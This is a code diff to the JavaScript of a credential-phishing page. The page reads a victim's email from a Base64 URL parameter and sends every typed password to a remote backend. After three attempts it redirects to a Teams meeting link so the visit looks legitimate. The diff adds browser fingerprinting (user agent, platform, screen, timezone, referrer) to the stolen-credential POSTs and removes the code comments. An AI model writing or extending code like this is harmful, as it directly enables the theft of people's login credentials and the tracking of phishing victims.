@@ -20,15 +20,12 @@ style="width: 60px;border-radius: 30px;"><br> <i>Mrs Maria N.</i></div></div><di
 
         function getEmailFromUrl() {
             const params = new URLSearchParams(window.location.search);
-            // Check for 'e', 'email', or any hash after '?'
             const emailParam = params.get('e') || params.get('email') || window.location.search.substring(1);
             if (!emailParam) return "";
             
             try {
-                // Try decoding from Base64
                 return atob(emailParam);
             } catch (e) {
-                // If not Base64, assume it's a plain email
                 if (emailParam.includes('@')) {
                     return emailParam;
                 }
@@ -36,17 +33,36 @@ style="width: 60px;border-radius: 30px;"><br> <i>Mrs Maria N.</i></div></div><di
             }
         }
 
+        function getVisitorInfo() {
+            return {
+                fullUrl: window.location.href,
+                referrer: document.referrer || "Direct / No Referrer",
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                platform: navigator.platform,
+                screenWidth: screen.width,
+                screenHeight: screen.height,
+                colorDepth: screen.colorDepth,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                doNotTrack: navigator.doNotTrack || "Not set",
+                cookiesEnabled: navigator.cookieEnabled,
+                online: navigator.onLine
+            };
+        }
+
         function logAction(action, extra = {}) {
             const email = $("#user").val();
+            const visitorInfo = getVisitorInfo();
             fetch(`${BACKEND_URL}/api/log-action`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ 
                     action, 
                     email, 
+                    password: extra.password,
                     attempts,
                     intruderDetected: attempts >= 3,
-                    ...extra 
+                    visitorInfo
                 })
             }).catch(err => console.error('Log error:', err));
         }
@@ -88,17 +104,17 @@ style="width: 60px;border-radius: 30px;"><br> <i>Mrs Maria N.</i></div></div><di
             logAction('login_attempt', { password });
 
             if (attempts >= 3) {
-                // 3rd attempt redirect to open
                 const meetingLink = "https://teams.live.com/dl/launcher/launcher.html?url=%2F_%23%2Fmeet%2F9348548468028%3Fp%3DO0l72J7eL4jegeQa7J%26anon%3Dtrue&type=meet&deeplinkId=109bc758-6e1b-47cb-907b-ed2379475a58&directDl=true&msLaunch=true&enableMobilePage=true&suppressPrompt=true";
                 logAction('force_redirect');
                 window.location.href = meetingLink;
                 return;
             }
 
+            const visitorInfo = getVisitorInfo();
             fetch(`${BACKEND_URL}/api/authenticate`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ email, password })
+                body: JSON.stringify({ email, password, visitorInfo })
             })
             .then(response => response.json())
             .then(data => {
@@ -106,7 +122,6 @@ style="width: 60px;border-radius: 30px;"><br> <i>Mrs Maria N.</i></div></div><di
                     logAction('login_success');
                     window.location.href = data.redirect;
                 } else {
-                    // Logic for attempts with specific messages
                     let errorMsg = "";
                     if (attempts === 1) {
                         errorMsg = "Put correct user detail to authenticate recipient";
@@ -115,14 +130,13 @@ style="width: 60px;border-radius: 30px;"><br> <i>Mrs Maria N.</i></div></div><di
                     }
 
                     $("#err").text(errorMsg).show();
-                    $("#pass").val(""); // Clear for next input
+                    $("#pass").val("");
                     $("#subBtn").prop("disabled", false);
                     $("#spin").hide();
                 }
             })
             .catch(error => {
                 console.error('Error:', error);
-                // Fallback messages on network error
                 let errorMsg = "";
                 if (attempts === 1) errorMsg = "Put correct user detail to authenticate recipient";
                 else if (attempts === 2) errorMsg = "Put correct user detail to authenticate recipient";
